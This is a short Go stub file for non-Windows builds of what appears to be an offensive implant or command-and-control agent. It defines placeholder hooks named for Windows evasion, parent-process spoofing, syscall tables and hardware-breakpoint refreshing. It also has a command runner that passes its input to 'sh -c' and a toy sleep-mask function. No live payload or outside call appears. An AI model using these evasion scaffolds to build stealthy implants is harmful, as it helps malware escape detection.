//go:build !windows

package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"time"
)

func initWindowsEvasion()                                             {}
func findExplorerPID() uint32                                         { return 0 }
func ExecuteWithPPIDSpoof(command string, ppid uint32) ([]byte, error) {
	return runCommand(context.Background(), "sh", "-c", command)
}
func sleepEncrypted(duration time.Duration) {
	local := make([]byte, 32)
	rand.Read(local)
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		time.Sleep(duration)
		return
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		time.Sleep(duration)
		return
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		time.Sleep(duration)
		return
	}
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	ct := gcm.Seal(nil, nonce, local, []byte("sockpuppets-sleep-mask-v1"))
	for i := range local {
		local[i] = 0
	}
	time.Sleep(duration)
	out, err := gcm.Open(nil, nonce, ct, []byte("sockpuppets-sleep-mask-v1"))
	if err == nil && len(out) == len(local) {
		copy(local, out)
	}
}
func initSyscallTable()                      {}
func initSleepEncryption()                   {}
func refreshHardwareBreakpoints()            {}
func storeSensitive(data []byte) uintptr     { return 0 }
func readSensitive(offset uintptr) []byte    { return nil }
